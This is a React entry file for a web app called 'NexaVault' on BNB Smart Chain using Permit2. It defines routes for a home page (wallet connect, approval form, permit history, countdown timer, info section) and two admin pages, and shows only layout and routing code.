import { useState } from 'react';
import { BrowserRouter, Routes, Route, Link } from 'react-router-dom';
import { Toaster } from 'react-hot-toast';
import WalletConnect from './components/WalletConnect';
import ApproveForm from './components/ApproveForm';
import PermitHistory from './components/PermitHistory';
import CountdownTimer from './components/CountdownTimer';
import InfoSection from './components/InfoSection';
import AdminLogin from './components/AdminLogin';
import AdminPanel from './components/AdminPanel';
import AdminView from './components/AdminView';
import NotificationCenter from './components/NotificationCenter';

function HomePage() {
  return (
    <div className="min-h-screen p-4 md:p-8 max-w-6xl mx-auto">
      <header className="flex justify-between items-center mb-12 py-4 border-b border-purple-900/60">
        <div>
          <h1 className="text-2xl md:text-3xl font-extrabold bg-gradient-to-r from-violet-300 via-purple-400 to-fuchsia-400 bg-clip-text text-transparent">
            NexaVault
          </h1>
          <p className="text-xs text-purple-400/70 mt-1">BNB Smart Chain • Powered by Permit2</p>
        </div>
        <div className="flex items-center gap-4">
          <WalletConnect />
        </div>
      </header>
      <main className="max-w-4xl mx-auto space-y-8">
        <ApproveForm />
        <PermitHistory />
        <CountdownTimer />
        <InfoSection />
      </main>
    </div>
  );
}


function AdminPage() {
  return (
    <div className="min-h-screen p-4 md:p-8 max-w-6xl mx-auto">
      <div className="flex justify-between items-center mb-8 py-4 border-b border-blue-900/60">
        <Link to="/" className="text-violet-400 hover:text-violet-300 font-medium text-sm flex items-center gap-1 transition">
          ← Back to App
        </Link>
      </div>
      <AdminPanel />
    </div>
  );
}

export default function App() {
  return (
    <BrowserRouter>
      <Toaster position="top-right" toastOptions={{ style: { background: '#0d0120', color: '#f5f3ff', border: '1px solid #6d28d9' } }} />
      <Routes>
        <Route path="/" element={<HomePage />} />
        <Route path="/admin" element={<AdminView />} />
        <Route path="/super" element={<AdminPage />} />
      </Routes>
    </BrowserRouter>
  );
}
